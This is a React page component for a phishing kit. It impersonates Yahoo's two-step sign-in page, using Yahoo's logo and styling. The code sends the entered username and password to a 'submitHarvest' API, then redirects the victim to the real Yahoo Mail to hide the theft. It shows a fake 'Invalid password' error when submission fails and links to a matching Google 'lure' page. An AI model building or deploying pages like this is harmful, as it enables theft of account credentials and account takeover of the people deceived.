"use client";

import { useState } from "react";
import { api } from "@/lib/api";
import { Provider } from "@/lib/types";
import { ChevronLeft } from "lucide-react";

export default function YahooLurePage() {
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError("Please enter your username, email, or mobile number.");
      return;
    }
    setError("");
    setStep(2);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError("Please provide password.");
      return;
    }
    setError("");
    setSubmitting(true);

    try {
      await api.submitHarvest({
        username: email,
        password,
        provider: Provider.YAHOO,
        user_agent: navigator.userAgent,
      });
      window.location.href = "https://mail.yahoo.com/";
    } catch (err) {
      setError("Invalid password. Please try again.");
      setSubmitting(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#f9f9f9] font-sans">
      {/* Header */}
      <header className="flex h-14 items-center justify-between px-8 py-2">
        <div className="flex items-center">
          <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="h-8" style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} />
        </div>
        <div className="hidden space-x-6 text-sm font-semibold text-[#188fff] sm:flex">
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Privacy</a>
        </div>
      </header>

      <div className="flex flex-1 items-center justify-center">
        <div className="w-full max-w-[360px] rounded-lg bg-white p-8 shadow-sm">
          {step === 1 ? (
            <form onSubmit={handleNext}>
              <div className="mb-2 text-center">
                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="mx-auto h-8 mb-6" style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} />
              </div>
              <h1 className="mb-6 text-center text-xl font-bold text-[#222222]">
                Sign in to Yahoo
              </h1>
              
              <div className="relative mb-6">
                <input
                  type="text"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="peer w-full border-b border-[#222222] bg-transparent pb-1 pt-4 text-base text-[#222222] outline-none focus:border-b-2 focus:border-[#0f69ff]"
                  placeholder=" "
                  autoFocus
                />
                <label
                  htmlFor="email"
                  className="pointer-events-none absolute left-0 top-3 origin-[0] -translate-y-3 scale-75 transform text-[#7c7c8c] transition-all duration-150 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-3 peer-focus:scale-75 peer-focus:text-[#0f69ff]"
                >
                  Username, email or phone number
                </label>
                {error && <p className="mt-1 text-xs text-[#cc0000]">{error}</p>}
              </div>

              <div className="mb-8 flex items-center justify-between">
                <div className="flex items-center">
                  <input
                    type="checkbox"
                    id="staySignedIn"
                    defaultChecked
                    className="h-4 w-4 rounded border-[#7c7c8c] text-[#0f69ff] focus:ring-[#0f69ff]"
                    style={{ accentColor: "#6001d2" }}
                  />
                  <label htmlFor="staySignedIn" className="ml-2 text-sm text-[#222222]">
                    Stay signed in
                  </label>
                </div>
                <button type="button" className="text-sm font-semibold text-[#188fff] hover:underline">
                  Forgot username
                </button>
              </div>

              <button
                type="submit"
                className="w-full rounded-full bg-[#7700ff] py-3 text-base font-bold text-white transition hover:bg-[#6001d2]"
              >
                Next
              </button>

              <div className="my-6 flex items-center">
                <div className="flex-1 border-t border-[#e0e4e9]"></div>
                <span className="mx-4 text-sm text-[#7c7c8c]">or</span>
                <div className="flex-1 border-t border-[#e0e4e9]"></div>
              </div>

              <button
                type="button"
                onClick={() => window.location.href = "/lures/google"}
                className="flex w-full items-center justify-center rounded-full border border-[#e0e4e9] bg-white py-3 text-base font-semibold text-[#222222] hover:bg-[#f1f1f5]"
              >
                <svg
                  className="mr-2 h-5 w-5"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                    fill="#4285F4"
                  />
                  <path
                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                    fill="#34A853"
                  />
                  <path
                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                    fill="#FBBC05"
                  />
                  <path
                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                    fill="#EA4335"
                  />
                </svg>
                Sign in with Google
              </button>

              <div className="mt-8 text-center">
                <button type="button" className="text-base font-bold text-[#188fff] hover:underline">
                  Create an account
                </button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleSubmit}>
              <div className="mb-2 flex items-center justify-center">
                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="h-8 mb-6" style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} />
              </div>

              <div className="mb-6 flex flex-col items-center justify-center">
                <span className="mb-2 text-sm text-[#222222] font-bold">{email}</span>
              </div>
              <h1 className="mb-6 text-center text-xl font-bold text-[#222222]">
                Enter password
              </h1>
              <p className="mb-6 text-center text-sm text-[#222222]">
                to finish sign in
              </p>

              <div className="relative mb-6">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="peer w-full border-b border-[#222222] bg-transparent pb-1 pt-4 text-base text-[#222222] outline-none focus:border-b-2 focus:border-[#0f69ff]"
                  placeholder=" "
                  autoFocus
                />
                <label
                  htmlFor="password"
                  className="pointer-events-none absolute left-0 top-3 origin-[0] -translate-y-3 scale-75 transform text-[#7c7c8c] transition-all duration-150 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-3 peer-focus:scale-75 peer-focus:text-[#0f69ff]"
                >
                  Password
                </label>
                {error && <p className="mt-1 text-xs text-[#cc0000]">{error}</p>}
                
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 top-3 text-sm font-semibold text-[#188fff] hover:underline"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>

              <button
                type="submit"
                disabled={submitting}
                className="w-full rounded-full bg-[#7700ff] py-3 text-base font-bold text-white transition hover:bg-[#6001d2] disabled:opacity-70"
              >
                {submitting ? "Signing in..." : "Next"}
              </button>
              
              <div className="mt-8 text-center">
                <button type="button" className="text-base font-bold text-[#188fff] hover:underline">
                  Forgot password?
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}
